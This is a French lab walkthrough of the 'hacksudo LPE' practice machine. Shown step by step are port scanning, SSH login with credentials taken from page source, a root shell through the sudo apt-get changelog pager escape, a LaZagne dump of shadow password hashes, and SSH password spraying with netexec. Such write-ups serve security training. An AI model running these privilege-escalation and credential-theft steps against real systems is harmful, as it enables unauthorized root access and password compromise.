# LPE
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.203
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.203...100%
[+] Scan Nmap 192.168.56.203...100%
 
[+] 80/tcp open
[+] 4200/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.203-tcp.html     |
==========================================================
```

&nbsp;

🌍 **Serveur Web**

Sur le port 80 il y a un serveur web , avec une page d’authentification , les cred sont dans le code source de la page, ensuite une liste de challenge s’affiche, j’ai cliquer sur le 1 ieme

![Capture du 2025-04-24 20-40-16](https://github.com/user-attachments/assets/39693693-0ff3-466c-b5d0-69270e053573)


&nbsp;

**<span style="color: #dddddd;">🔒</span> SSH**

Cred `user1:hacksudo`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $ssh user1@192.168.56.203
user1@192.168.56.203's password: 
Linux hacksudoLPE 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 18 16:25:02 2025 from 192.168.56.149
user1@hacksudoLPE:~$ 
```

&nbsp;

Avec un `sudo -l` on peut voir qu’elle binaire exécuter pour être `root` sans mot de passe  avec `apt-get`

```
user1@hacksudoLPE:~$ sudo -l
Matching Defaults entries for user1 on hacksudoLPE:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user1 may run the following commands on hacksudoLPE:
    (root) NOPASSWD: /usr/bin/apt-get
```

&nbsp;

**<span style="color: #dddddd;">⚙️</span> GTFObin**

Allons sur `gtfobin` pour voir si avec `apt-get` nous pouvons être `root`

![Capture du 2025-04-18 22-34-34](https://github.com/user-attachments/assets/aa9e459a-451d-4d49-9fd1-01378c5b3fbe)

&nbsp;

💀 **APT-GET**

Elevation de privilege avec `apt-get`

```
user1@hacksudoLPE:~$ sudo apt-get changelog apt

  * SECURITY UPDATE: Integer overflow in parsing (LP: #1899193)
    - apt-pkg/contrib/arfile.cc: add extra checks.
    - apt-pkg/contrib/tarfile.cc: limit tar item sizes to 128 GiB
    - apt-pkg/deb/debfile.cc: limit control file sizes to 64 MiB
    - test/*: add tests.
    - CVE-2020-27350
  * Additional hardening:
    - apt-pkg/contrib/tarfile.cc: Limit size of long names and links to 1 MiB
  * Fix autopkgtest regression in 1.8.2.1 security update

 -- Julian Andres Klode <jak@debian.org>  Mon, 07 Dec 2020 12:31:04 +0100

apt (1.8.2.1) buster-security; urgency=high

  * SECURITY UPDATE: Out of bounds read in ar, tar implementations (LP: #1878177)
    - apt-pkg/contrib/arfile.cc: Fix out-of-bounds read in member name
    - apt-pkg/contrib/arfile.cc: Fix out-of-bounds read on unterminated
      member names in error path
    - apt-pkg/contrib/extracttar.cc: Fix out-of-bounds read on unterminated
      member names in error path
    - CVE-2020-3810
  * .gitlab.ci.yml: Point to debian:buster

 -- Julian Andres Klode <jak@debian.org>  Tue, 12 May 2020 11:57:30 +0200

apt (1.8.2) unstable; urgency=medium

  [ Alwin Henseler ]
  * Flip /: in documented default value of DPkg::Path (Closes: #917986)

  [ TilmanK ]
  * Fix typo in German manpage translation

  [ Am<C3><A9>rico Monteiro ]
  * Portuguese manpages translation update (Closes: #926614)

  [ Jean-Pierre Giraud ]
:!/bin/bash
```

&nbsp;

```
user1@hacksudoLPE:~$ sudo apt-get changelog apt
Get:1 store: apt 1.8.2.2 Changelog
Fetched 458 kB in 0s (0 B/s)
root@hacksudoLPE:/home/user1#
```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

63 utilisateurs trouvers

```
root@hacksudoLPE:/home/user1/LaZagne-2.4.6/Linux# python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: user9
Hash: $6$ZJwQtNw1C0UUnjqd$PYjIiBqwEnjv7WGzeNNKdh6L5GxJ1bJIAxcTG/nTCnGKuAthwnqJ4Nsoj6UUFCXqLnxmg4z68HeTYb8XapIW7/:18750:0:99999:7:::

[+] Hash found !!!
Login: user32
Hash: $6$6CvLuQaMY6hxgb4W$ohLNSoASgHc4d3qqiWEi2uEInnMsMaMGs7h2hah7N9DRMw8W8//LiiJCkJPPPoZmICW.qV8IRUZK.h3354HaE1:18750:0:99999:7:::

[+] Hash found !!!
Login: user46
Hash: $6$.uta6qyahdshRD7d$YVivI84248R4tBlX40jHXxNDTott9MemepgL.M9HnTmNdd5PslJqGpJd6KrAgeZVH5pnQLeiA/fE1a5TI6YnN0:18753:0:99999:7:::

[+] Hash found !!!
Login: user30
Hash: $6$.ZQp.Q0104np8oAU$dJY6jMorRkS5GvhlQkphE5ZFiF72kCmCtexa83SBonI266XVD5tyzvlOFFn8ctZ03.MNnhX59bPXwQSkloJo50:18750:0:99999:7:::

[+] Hash found !!!
Login: user36
Hash: $6$MGxI9jZAf4sy8JWu$dq39NY3nI3Rvi86qw1W1U1fWNIqOYeuc3cHTC/fs./AUXtOQx8DV6anOXTmoevzwDHdbLEqdJAiiQLMCMGG7W0:18750:0:99999:7:::

[+] Hash found !!!
Login: user40
Hash: $6$108IN2TdLcOzet/c$TY1hwP2fzwuWUuj4GDeEee4cp/47XGgr.EfUCyGhiCpWnpDRAt8TiwMqPd8LL8qFx05vfkzjnFT7bO4cq9m8N/:18753:0:99999:7:::

[+] Hash found !!!
Login: user54
Hash: $6$DpqB8x5sLnQubprm$VS2d1grp.3btGcj/KYp6rowlvQbC989T.O80pXIkF.BaREu8EGbRWd8mds.1M7ZHegGwi/m2iD7ZnVKuNltjm0:18754:0:99999:7:::

[+] Hash found !!!
Login: user52
Hash: $6$yXnDufPGxQG6tIrS$uHg5.5.3wuYOzvCt3IvXwZuwwtKIPBNDH6X8prATlcEnsxopjBA1xjCkL4T9aKFJU3ACSg91wcPRp/dqwagWQ/:18753:0:99999:7:::

[+] Hash found !!!
Login: user17
Hash: $6$7gx47NJF7/6DNjBD$HqXkvGVAGZGgwpu8/Bo8u0kkAvHTjDX7wMxtRaYqHsQCtpk9DOz9wwe7hhpTjA0NYTpQ6G17YwNWAXKHa71S./:18750:0:99999:7:::

[+] Hash found !!!
Login: user44
Hash: $6$FUMm9CHSHVKGIA4/$mmWwhF3Hr.H7of4ru/PDyw3rfVteHoDobwtbDpEOzv2h6WvmIK0tTBmJhDuPP8/EZicpubSGY3KyUg22jELrb1:18753:0:99999:7:::

[+] Hash found !!!
Login: user21
Hash: $6$LbAyj8NgtZ3N5iin$TS9j.JoGTV/drO6WfOmYBB.XvLb7YQL.RIhf01sbdch9tcpk1QOBvGJVfJ7wYlVxPiki76MSsSBwABVwtDrNI.:18750:0:99999:7:::

[+] Hash found !!!
Login: user22
Hash: $6$0TD7LigDzRqJeepu$TWpbPhVYsUkG.F9kHzzsD/mpfZUgSLvvcd0/PZF5oP2yZy0xoqEYA6gQGLOrqJ6R/gYudhi9EUxxRA.AQvdCK0:18750:0:99999:7:::

[+] Hash found !!!
Login: user42
Hash: $6$05v6LueO.Cp65J3p$i9YB1F7dsJDmCMAAPyx76xv6cG6Xrd/8bTOzjGiB3wsJwOmKBooFxf8jr33dFUDl8j7EOoRSU0ISb3P8PsLrA.:18753:0:99999:7:::

[+] Hash found !!!
Login: user6
Hash: $6$QsnHmFHWrwBYs5/R$4dnFmqnMpng3dH4Tm.H5reP9H8SuDLTWV9oTqrDasQKTNvjlnaw4TzJaLV5kuWdSwCwjvO9gdd9YVMyEOB1Pl0:18750:0:99999:7:::

[+] Hash found !!!
Login: user14
Hash: $6$19/CF4gXSvvtTr.5$ZZ2owEjIMwdU6hcrgqUFoim1Vy2rtAfYiDJgBDSiGhHCvtTmWW5SFI/Q/Eae34Zm5yPBNFBC7XK6grZGkIE/B/:18750:0:99999:7:::

[+] Hash found !!!
Login: user24
Hash: $6$PLO5xC3LjwWypshf$Igz0lVktVnNELPjnjoXxqFAMbUiRdjzi1HBsAg52E9iwvjTUvLyoGQvBDRrpCiPf5pSvVirsY4O5itsSYhSnS0:18750:0:99999:7:::

[+] Hash found !!!
Login: user38
Hash: $6$WJJqJofR4P.OXiF4$LgQQIFlBbMnYhDSkAot/vgROVrVUarh8MxVaBtJELg92vKboN25fvMy4JVmNRbs.UndOK2t21icV9Fpf88onB/:18753:0:99999:7:::

[+] Hash found !!!
Login: user55
Hash: $6$NO8LVBHsGO7XvA.o$r5NGe3JMlPnbGZqmaJVbbXOtYf3H8hKRDZOE.tJpRmJX0c73THHGsJsnsKJSUUP0dXIc2b9cYMg8iwuimzEW1.:18754:0:99999:7:::

[+] Hash found !!!
Login: user3
Hash: $6$tL/wHaG64m5t/xj1$DT7sO43zq3vDBrbK/ML5US74vngiNfUaIGER2yG0WttTn3P.wMRO9ntSZY.NGyccJyxJJqGl38ScXoUXHp9f..:18748:0:99999:7:::

[+] Hash found !!!
Login: user47
Hash: $6$AfCk201by8KSc99C$cLm69Dy/RbAnZSG/ddcMblUzi.iGxSKwi7UE6kPSK8n.rGzIclqpMaytC/evTGR4dfyhK2susdehqRso7Ut6I.:18753:0:99999:7:::

[+] Hash found !!!
Login: user61
Hash: $6$eTCx21L0FXaChxLw$6ulvf3G8H6ypm6vpoYAbFdse23Va.U7igZSKeoYpNjIAibnZmm38KiusjVDJK8phPoLkeSt1Or2fH2W4uaLuk0:18755:0:99999:7:::

[+] Hash found !!!
Login: user53
Hash: $6$LDHWUo8OADg7FNHF$B6LgKZuWrJMyq0But2lyjei0F37uyrxOn.dce33KvVWB5b4jFjfhT5MNFiAE4ERFlXLtn71Yj30jZ4k6SjfaC.:18753:0:99999:7:::

[+] Hash found !!!
Login: user13
Hash: $6$K0liHcMdOhiRhZwC$cIsmfw5rVOVOVzrQeMmo6ekPDDmI1bjYkqwnqEFY2dUrxI5ywURjtY5rbpxonOD.n7HzIIqO6MOG7WEiCNpD6/:18750:0:99999:7:::

[+] Hash found !!!
Login: user31
Hash: $6$yZxG4XNSB3fPh1BQ$JxNPB0orz7x9st8rrm1lMfik1OujNWkgppIj/F2p7HzDKZ6wWXhphyHA/q/iNEKVDHrh.sTJviLKjDur3yRI81:18750:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$P8IHbomuYSfgjUq2$JdkBkW9mH3pts62HkwT8tuKdcvSdTZss.P4RaR/I34k6CzfcIQJQs02dSjjtAwvS90uhJZ2yug9st7gIWr1QV1:18741:0:99999:7:::

[+] Hash found !!!
Login: user4
Hash: $6$KzSD028kIvuwCtAe$u7jhwGapMvpkOC9uKEIOe7QvrLxeAppwtBUMz.PaM/zMXsDUz97BsTVXDqa0qtGO4pyqmaMyu8xp9tslZb6Kq.:18748:0:99999:7:::

[+] Hash found !!!
Login: user50
Hash: $6$ibqjQACwl7mhbMJc$JEgOE7Ic10kUz0sxH.vNKD1lxOcdaFACz9Xp31sDeMTv.ZdUuMnbX56NIwHSkLClzSGVXcw92KougoSKqb5us.:18753:0:99999:7:::

[+] Hash found !!!
Login: user29
Hash: $6$FgjJ492RYRA.xrBX$o6bjoHCnT0WhCuMqxixAg/VgclrS5SqLwcg10K2qm32cX0Tm37t/W3Ao21SvzjEdLoNGrGmaa0DIcKsBTJd7X.:18750:0:99999:7:::

[+] Hash found !!!
Login: user11
Hash: $6$hKTqZ//eMnzx.pVN$wcmMX3NXSYvcqadB5LWO/I00UO50Xv6uScl2BxhekFxnOZzTbdXRK49HLbUxAd3Udc9sIdJyc4dNPR6l05sMv.:18750:0:99999:7:::

[+] Hash found !!!
Login: user12
Hash: $6$cHwtCJ3reG342YAJ$AY7goqOck5.UoeHXe6X7K3au1EOXjJV2W8LjG99tLD7E54zYcvEMw6/k9UEj/NAkww.BybmLQUzYOaCOosNFq0:18750:0:99999:7:::

[+] Hash found !!!
Login: user57
Hash: $6$YouE6cTJXGgmUMHW$/UF0Xen6fWKq1HJeCNTJmgUJDiLcJ2lEkOGdLtRQUn4uQDLjVGY3VOjU79RkUXC5bBHtfb5ooGAXeqPevvFWP/:18755:0:99999:7:::

[+] Hash found !!!
Login: user41
Hash: $6$OUTPmXvgcHWQiCCs$grIgsYefZRGyoGPEahweDWAmr.ZKBP/2NPki/55/MSVCWb2RthQxtAoxEH3R0OAYLW432BwGJ28ML8vHdaxoo1:18753:0:99999:7:::

[+] Hash found !!!
Login: user43
Hash: $6$MLTP1enpZGJKfuHT$D1l23hcpjC8eDCu3K64V38Jspew0WaxsxX5vP3pCduFEH1Lwn5M.QKTnjF/1g7eIfHPeEkNumTUMFXdisODE21:18753:0:99999:7:::

[+] Hash found !!!
Login: user60
Hash: $6$WlG8JKM.W.b8caT/$s00nt4wivBThqM5umeJJlE3V2m9TkXkFZezdO0MRyhkZPD0cGxiQ.FIpYbYFyx9FUdRD1By/AY8AWuUm7rkU10:18755:0:99999:7:::

[+] Hash found !!!
Login: user28
Hash: $6$mwtuGypAod5wh6ni$K.ocb88dt0AbmNV5YMEYIpnqEuWI3osakdCNG4mnZYGtfsoT992YFNZJtVEEkRXJvPABVQul0Dt4vkSn15RtU.:18750:0:99999:7:::

[+] Hash found !!!
Login: user33
Hash: $6$oBihPji.PXqdE3XV$sQ6Bg.adFbKmnASEszfJlDgYM1LsI.NgderBZMTwOEORLLjDK6w5v8Q4aJdlqmEsnVr8cD6esZSKNGaCShqiB0:18750:0:99999:7:::

[+] Hash found !!!
Login: user15
Hash: $6$cSkzjhF7p3qH3gLp$8NeAadetm0R1hBLqm4dGsFSI3hikrh9vBGN4ezKK/P64NNi8RhtPMCH9TmFLfaWA0mFT6S6cCWRxA9NtsE8y1/:18750:0:99999:7:::

[+] Hash found !!!
Login: ar
Hash: $6$QWMR9VYCHHjo8O.E$KWb.o9xX9MfzIAsUrrVb2ioHoe4QxxLEFVwPjL0fC/UycnbphGtg5zlhuIcEqCgNjgMy/w4ks0S1k4CKAezzJ/:18750:0:99999:7:::

[+] Hash found !!!
Login: user35
Hash: $6$gQUVdePfrfQEXbcD$RCOp3YdwVdUQ8D0Wjw73oCEh86bWRX8IdVSfy4J3NmhrOGwVh.9TNvhMurA57PqJ4tMjhUKeSieQ4jLMHD2i9.:18750:0:99999:7:::

[+] Hash found !!!
Login: user27
Hash: $6$q7dNU4zr46C6TO3B$lGiuAxsE.C/gJ5Tt8/umnx5K1GDJrW958ri43FYoRq5hgBH/yddhMtFwOeD//zU7qKqDBOZG1IH5y5HqBDgU60:18750:0:99999:7:::

[+] Hash found !!!
Login: user45
Hash: $6$z44K2uppkSfyctSB$ugsdc4unYwo6E59ApIz11wxMF0YqYg4SIDDoZHBV5dcKYsZshaMSmdFVKiyvDyKZJktln6RHGsEwoUS8eeMaX0:18753:0:99999:7:::

[+] Hash found !!!
Login: user51
Hash: $6$S4uiFOOADs1ffM3/$A4IDPAl2wxOLDV7X8jVe/dZBWoG6kCMhCHCHNwTuS/wtEdjSHHOSx3ap9MsafoQhGBlCLADuvuFk3pZ5xQBvX0:18753:0:99999:7:::

[+] Hash found !!!
Login: user58
Hash: $6$jvgfdCjDg4Aw4DuJ$jjOSjMGeBEIhsHpqVQmFgFSbu9a4JoX7TzlbsgGjv5ggLBTMueliq0tJiYE9OTBKHKl2cvg/HZ2jrTx7hkmgK.:18755:0:99999:7:::

[+] Hash found !!!
Login: user56
Hash: $6$qQstTq5WvBBe1HxD$RLn83p0WB0D13cA6xhLSap3MXCbLOBtQySqi.AYw.6F6NRRvAlJvcbRvUyUnoiMQAYV4/EWJe96NEDujTbweS0:18754:0:99999:7:::

[+] Hash found !!!
Login: user59
Hash: $6$HROhFef9kNWRv2cs$OefHi5PuFR47j8/nWbrkMY8jmy/oj7czMLWTLW9DXZd1nPdzF7ZX2v4q4BIyfncalnXNmj8Cj3CIwSw8NcIl4.:18755:0:99999:7:::

[+] Hash found !!!
Login: user16
Hash: $6$JOztdjIxoj5iaxuN$0l364KhTMxohBvg/WcIfSlsutga/WYEaelaR8tVzjlsFGiTO25gAfo/nce/snxG1D6a0YM0mJ6u6jiVw3aPZf.:18750:0:99999:7:::

[+] Hash found !!!
Login: user18
Hash: $6$QwM4n06fbBOOS1Qa$w1W7m8Q5xtZ5bFxMhRdGnPxCeKuRbD/ROWGtjMw2klR.Pd4MIY0ZgA1F04II5s1geToIsVKKgwiN8nowZf7hG/:18750:0:99999:7:::

[+] Hash found !!!
Login: user1
Hash: $6$XWkLRiM13gJfc0M1$AJaRb8e27V1.wgiKaznSxkq2JjL5Umq5Wolh/FvC0e4/dspvE59DC1yNXWxtEkQZ1pozp8KLx4drZAVS4FF4H1:18748:0:99999:7:::

[+] Hash found !!!
Login: user34
Hash: $6$6O1Mgch7THQTVo.N$hpv2w2jixepqUmdtXs7L2Vnto90QgCCUhV3/d6ehpTvkgIY6VraxyEPR9WPBlYVOmfFnO2RDQCNQdF8TV7rkL.:18750:0:99999:7:::

[+] Hash found !!!
Login: user20
Hash: $6$0SbaXqPvoIUSBTpv$hCFOi8ZSBlQSZ4tO21b2QJpuevCzAKfcqIi0AYZ16ahbqZR5.VQ8/1/w0MvMdlmOTbu0Xxtf2KHM5e/g1t2Cu.:18750:0:99999:7:::

[+] Hash found !!!
Login: user2
Hash: $6$GF5RrMwyT7chzArS$GcpN6lDyvxLYjwdI1jjfIIjvlkN/si5v2GZFYOChHFt6G3hIaPROvmiRmoTjnzUw1b7nHY91VVhnudhPymZT80:18748:0:99999:7:::

[+] Hash found !!!
Login: user7
Hash: $6$EpWKiyMJJexrrR.l$n7lEKH.ybfAqjo.jjS1J7VPR2ufTQBQING1A4EP8UxEh5IcT7MM4KVuCRnkv1tOJPvAR5oaoqqbdLPdhZSbzk/:18750:0:99999:7:::

[+] Hash found !!!
Login: user5
Hash: $6$G9w.hVpBXsu3zUK2$8YWrvGiYtEylS5pJn5vG5HbdHJJ1thMmvv3jxmQS7uVBjFWataCJXy1sk6JzvfByLYVsJAvWERNQiA.k4dauA1:18748:0:99999:7:::

[+] Hash found !!!
Login: user48
Hash: $6$Tzb1Fi9veIwjW2b3$UDxxopuV1haLc4PgO18.mZKp9ykckt5tkgYUJ0i8r2SeUTWTkv.U65abD0OHC6sckVumhYH.L86G2lWXfkNmL.:18753:0:99999:7:::

[+] Hash found !!!
Login: user49
Hash: $6$AxB88DztfLNNLXD5$WRaqxxEhym5920oriycUkrtq/VhBC5/JxlB3gKKSahjjAPBBe10Yd0K3YjOasFDmq5IyI9JQgvMJ9yIJ2Toed/:18753:0:99999:7:::

[+] Hash found !!!
Login: user8
Hash: $6$CqTyH4rzP7bHVWEf$nlsynuFXRpnBrLBTHqFap4CNSbJFIvTBolTYU8N68sbRoK.7CnqaIFXJkoqyB/cmGLmwUq8M7omrd1yPR/qS00:18750:0:99999:7:::

[+] Hash found !!!
Login: user19
Hash: $6$3iL/GwxzMHIvg00h$8qBKpYt0NPF9Q.ackVaD9..SoY9yGf9K8qvXWW26v7iQ/hn34W1MT5ygtC18ObCY3YF9MjBCza7rzvVNbub2w/:18750:0:99999:7:::

[+] Hash found !!!
Login: user39
Hash: $6$xmRMZdtTSgnT9Ji4$hWPpLnyBqyAlk3hTK72gXI4qisuIfchSYpZrk31giY.mhWTazhWtAxOjEbpeBpjxAdsfjJFYPdws4LY4wAagz.:18753:0:99999:7:::

[+] Hash found !!!
Login: user25
Hash: $6$WGs2fhLJiBdgbygd$Q12U/p260hGAIs7UddAaaX.0w/37P9inOlnq8sLNAo7iyNkFq/wNKHm7i9cz8D2F8D13YuCLozapZg3OAKaGt0:18750:0:99999:7:::

[+] Hash found !!!
Login: user26
Hash: $6$F7c8VUPZDgIVHtIf$qql1NXEnkKsDbRwQGWXBuEkPzI39lNDYKVdasc4AWNFIbCmssIwQkMRNIYPC0ziZNNlmuuLt1BCz3E6pq23620:18750:0:99999:7:::

[+] Hash found !!!
Login: user23
Hash: $6$8aLN2tmKeF4Kiiog$Yew5dcIG48ZtdgXJt5Opa6Xosw64lYlkdeHYHHdk7bQEpEXNyk7wAJHMjx7CTUlXw3vM2kO.IDYk47wIdY6SQ1:18750:0:99999:7:::

[+] Hash found !!!
Login: user10
Hash: $6$C2LHnHtLW/82VcO2$csWVpijRaRmpfcdftQ3pudf41tR5L8l361fIN9/FGd//exVgbt8..dObrV.ETGRc/Gg42RcrD//NBhpB/VE2J0:18750:0:99999:7:::

[+] Hash found !!!
Login: isro
Hash: $6$v6HLdMmUOGtb/X1o$MvwoaBZ8B1BrFQ20d4p1H18yeOZVjwRb5cTCGWufUeT8LGkuVvrtvuqMBGDMSqaHRbGJ5v0u4MnNl2z9qEdCK.:18741:0:99999:7:::


[+] 63 passwords have been found.

elapsed time = 137.11260795593262

```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> Netexec**

Test du `mot de passe` sur tout les utilisateurs

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.213 -u user.txt -p hacksudo --continue-on-success
SSH         192.168.56.213  22     192.168.56.213   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         192.168.56.213  22     192.168.56.213   [+] user9:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user32:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user46:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user30:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user36:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user40:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user54:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user52:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user17:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user44:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user21:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user22:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user42:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user6:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user14:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user24:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user38:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user55:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user3:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user47:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user61:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user53:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user13:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user31:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [-] root:hacksudo
SSH         192.168.56.213  22     192.168.56.213   [+] user4:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user50:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user29:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user11:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user12:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user57:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user41:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user43:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user60:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user28:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user33:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user15:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] ar:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user35:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user27:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user45:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user51:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user58:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user56:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user59:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user16:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user18:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user1:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user34:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user20:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user2:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user7:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user5:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user48:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user49:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user8:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user19:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user39:hacksudo  Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user25:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user26:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user23:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [+] user10:hacksudo (Pwn3d!) Linux - Shell access!
SSH         192.168.56.213  22     192.168.56.213   [-] isro:hacksudo
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| user1 a user60 | hacksudo |
| ar  | hacksudo |
